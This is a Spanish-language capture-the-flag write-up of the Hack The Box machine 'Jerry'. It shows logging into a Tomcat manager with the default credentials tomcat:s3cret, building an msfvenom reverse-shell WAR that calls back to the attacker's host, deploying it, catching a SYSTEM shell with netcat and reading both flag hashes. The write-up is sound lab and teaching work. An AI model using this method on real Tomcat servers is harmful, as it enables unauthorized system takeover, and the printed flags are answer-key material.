# Hack The Box: Jerry - Writeup
_by Fz3r0_ 💀

_Keywords_`Hack The Box` `CTF` `Windows` `Jerry` `Java` `Tomcat` `Apache` `Reverse Shell`


## Datos de los objetos involucrados: 


- [⭕] Host Atactante IP (local):.................. 192.168.30.148

- [🔴] **LHOST** - Host Atactante IP (túnel):...... 10.10.14.5

- [🔵] **RHOST** - Host Víctima IP/Dominio.TLD:.... 10.10.10.95


## Resultados de Auditoría de Sistema Operativo: 


- [🔵] Reporte de auditoría a Víctima/RHOST:....... 10.10.10.95

- [🟢] Estado Actual de Víctima/RHOST:............. Host Activo

- [🔵] Sistema Operativo de Víctima/RHOST.......... Windows

- [🔵] Resultados basados en TTL:.................. 127

- [⚪] Fecha de Auditoría y Muestreo:.............. 2023-01-01 11:16:25

- [💀] Auditoría de Seguridad realizada por:....... Fz3r0 💀

## Resultados Preliminares de Auditoría de Puertos: 


- [🔴] Se encontraron <(( 1 ))> Puertos ABIERTOS en Víctima/RHOST:

    - [💀] -->> **` 8080 `**


## Resultados Avanzados de Auditoría de Puertos & Servicios: 


- [🔴] Detalles de Servicios & Versiones en sockets de Víctima/RHOST: 

    - [💀] -->>  8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1


## Auditoría Preliminar de Vulnerabilidades en Víctima/RHOST: 


- [😔] -->>  No se han encontrado vulnerabilidades de manera automática.

## Detalles adicionales al puerto 8080

```java
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
```

## Whatweb + Wapalyzer

- `whatweb http://10.10.10.95:8080 -v`

```sh
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Jerry]
└─$ whatweb http://10.10.10.95:8080 -v
WhatWeb report for http://10.10.10.95:8080
Status    : 200 OK
Title     : Apache Tomcat/7.0.88
IP        : 10.10.10.95
Country   : RESERVED, ZZ

Summary   : Apache, HTML5, HTTPServer[Apache-Coyote/1.1]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        String       : Apache-Coyote/1.1 (from server string)

HTTP Headers:
        HTTP/1.1 200 OK
        Server: Apache-Coyote/1.1
        Content-Type: text/html;charset=ISO-8859-1
        Transfer-Encoding: chunked
        Date: Sun, 01 Jan 2023 23:40:13 GMT
        Connection: close
```

## Visita a Web en 8080 con Tomcat

### Rutas típicas de Apache Tomcat (Fuzz :P):

- `/manager`
- `/manager/html`

### Dentro del directorio `/manager/html`


- Al tratar de hacer login y recibir error muestra el landing page de ejemplo:

```java
401 Unauthorized

You are not authorized to view this page. If you have not changed any configuration files, please examine the file conf/tomcat-users.xml in your installation. That file must contain the credentials to let you use this webapp.

For example, to add the manager-gui role to a user named tomcat with a password of s3cret, add the following to the config file listed above.

<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>

Note that for Tomcat 7 onwards, the roles required to use the manager application were changed from the single manager role to the following four roles. You will need to assign the role(s) required for the functionality you wish to access.

    manager-gui - allows access to the HTML GUI and the status pages
    manager-script - allows access to the text interface and the status pages
    manager-jmx - allows access to the JMX proxy and the status pages
    manager-status - allows access to the status pages only

The HTML interface is protected against CSRF but the text and JMX interfaces are not. To maintain the CSRF protection:

    Users with the manager-gui role should not be granted either the manager-script or manager-jmx roles.
    If the text or jmx interfaces are accessed through a browser (e.g. for testing since these interfaces are intended for tools not humans) then the browser must be closed afterwards to terminate the session.

For more information - please see the Manager App HOW-TO. 
```

- Por alguna razón las contraseñas de ejemplo son las usadas en el login...

```
<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>
```

### Credential Harvesting a) Tomcat login:

- **`tomcat:s3cret`**

## Dentro del Web Manager Tomcat:

- Información:

```java
Server Information
Tomcat Version  JVM Version     JVM Vendor  OS Name     OS Version  OS Architecture     Hostname    IP Address
Apache Tomcat/7.0.88    1.8.0_171-b11   Oracle Corporation  Windows Server 2012 R2  6.3     amd64   JERRY   10.10.10.95
```

- **Importante:** El manager **Permite subir archivos WAR**, es posible deje subir archivos maliciosos. 

- Solo es necesario ir a la sección `WAR file to deploy` y `Browse...`

## Payload malicioso con `msfvenom` para el WAR

- lista de payloads de msfvenom para `Java`:

```java
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Jerry]
└─$ msfvenom -l payloads | grep java
    java/jsp_shell_bind_tcp                                            Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp                                         Connect back to attacker and spawn a command shell <<< --------------- Reverse TCP ftw!!!
    java/meterpreter/bind_tcp                                          Run a meterpreter server in Java. Listen for a connection
    java/meterpreter/reverse_http                                      Run a meterpreter server in Java. Tunnel communication over HTTP
    java/meterpreter/reverse_https                                     Run a meterpreter server in Java. Tunnel communication over HTTPS
    java/meterpreter/reverse_tcp                                       Run a meterpreter server in Java. Connect back stager
    java/shell/bind_tcp                                                Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Listen for a connection
    java/shell/reverse_tcp                                             Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager
    java/shell_reverse_tcp                                             Connect back to attacker and spawn a command shell
```

- Creando el payload

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=666 -f war -o f0_shell_jsp.war
```

```sh
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Jerry]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=666 -f war -o f0_shell_jsp.war
Payload size: 1085 bytes
Final size of war file: 1085 bytes
Saved as: f0_shell_jsp.war
                                                                                                                                                                                                                                                                                                        
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Jerry]
└─$ ls -lAh | grep shell
-rw-r--r-- 1 fz3r0 fz3r0 1.1K Jan  1 12:06 f0_shell_jsp.war <<<------- 
                                                                                                                                                     
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Jerry]
└─$ 

```

## Ejecutando la Reverse Shell con payload WAR

- Solo es necesario subir el file y dar click en `deploy`

- Aparecerá en la lista y solo es necesario ejecutarla...

- **Antes dejar escuchando al `netcat`**

- Dar click y recibir la reverse shell:

```sh
┌──(fz3r0㉿Fz3r0)-[~/Documents/01_-_Fz3r0_HTB/Jerry]
└─$ rlwrap nc -nlvp 666
listening on [any] 666 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system    <<<<------------- PWN!!!

C:\apache-tomcat-7.0.88>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::210
   IPv6 Address. . . . . . . . . . . : dead:beef::6c16:7b51:7e64:9406
   Link-local IPv6 Address . . . . . : fe80::6c16:7b51:7e64:9406%11
   IPv4 Address. . . . . . . . . . . : 10.10.10.95
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:17d8%11
                                       10.10.10.2

Tunnel adapter isatap.{E6565A26-EF2E-43A5-A579-B0F25E7B1DC8}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : htb

C:\apache-tomcat-7.0.88>
```

## Localización de las Flags

- Ambas están en el mismo archivo en un lugar típico... `C:\Users\Administrator\Desktop\flags`

```cmd
C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,364,657,664 bytes free

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
C:\Users\Administrator\Desktop\flags>

```

## Referencias

- https://app.hackthebox.com/machines/144
- https://www.youtube.com/watch?v=bB-M5vPegMk


